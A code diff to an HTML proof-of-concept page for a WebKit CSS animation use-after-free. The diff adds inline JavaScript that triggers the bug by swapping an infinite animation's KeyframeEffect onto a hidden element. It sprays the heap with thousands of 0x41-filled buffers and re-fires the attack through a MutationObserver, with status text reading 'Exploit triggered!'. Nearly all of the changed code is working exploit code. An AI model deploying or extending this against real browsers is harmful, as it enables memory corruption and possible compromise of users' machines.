@@ -12,24 +12,74 @@
         padding: 10px;
         font-size: 16px;
       }
+      #status {
+        margin-top: 10px;
+        font-weight: bold;
+      }
     </style>
 </head>
 <body>
-    <h1>CVE WebKit CSS Animation UAF</h1>
+    <h1>WebKit CSS Animation UAF</h1>
     <p>Click the button to trigger the PoC. (Browser may crash or show exploit messages)</p>
-    <button id="button">Trigger </button>
+    <button id="button">Trigger PoC</button>
+    <div id="status">Waiting...</div>
     <object type="image/png">
         <cite></cite>
         <dl hidden></dl>
     </object>
     <p>PASS if this test doesn't crash</p>
     <script type="module">
-        import { triggerUAF } from './poc.js';
+        import { debug_log } from './module/utils.mjs';
+
+        const object = document.querySelector("object");
+        const cite = document.querySelector("cite");
+        const dl = document.querySelector("dl");
+        const status = document.getElementById("status");
+        const DELAY = 100;
+        let attemptCount = 0;
+
+        function heapSpray() {
+          let spray = [];
+          for (let i = 0; i < 10000; i++) {
+            let arr = new Uint8Array(0x1000);
+            for (let j = 0; j < arr.length; j++) {
+              arr[j] = 0x41;
+            }
+            spray.push(arr);
+          }
+          return spray;
+        }
+
+        function triggerUAF() {
+          attemptCount++;
+          debug_log("Attempt #" + attemptCount + ": Initiating exploit...");
+          status.textContent = "Attempt #" + attemptCount + " in progress...";
+          object.data = "x";
+          cite.style.animationIterationCount = "infinite";
+          setTimeout(() => {
+            const animation = cite.getAnimations()[0];
+            object.width = "1em";
+            object.codeBase;
+            animation.effect = new KeyframeEffect(dl, {});
+            heapSpray();
+            debug_log("UAF triggered, check for crash or memory corruption.");
+            status.textContent = "Exploit triggered!";
+          }, DELAY);
+        }
+
+        const observer = new MutationObserver((mutations) => {
+          debug_log("DOM tree modified, attempting UAF exploit...");
+          triggerUAF();
+        });
+
+        observer.observe(object, { attributes: true, childList: true, subtree: true });
+
         document.getElementById('button').addEventListener('click', () => {
             try {
                 triggerUAF();
             } catch (e) {
-                alert('Error: ' + e.message);
+                debug_log("Error occurred: " + e.message);
+                status.textContent = "Error: Exploit failed.";
             }
         });
     </script>
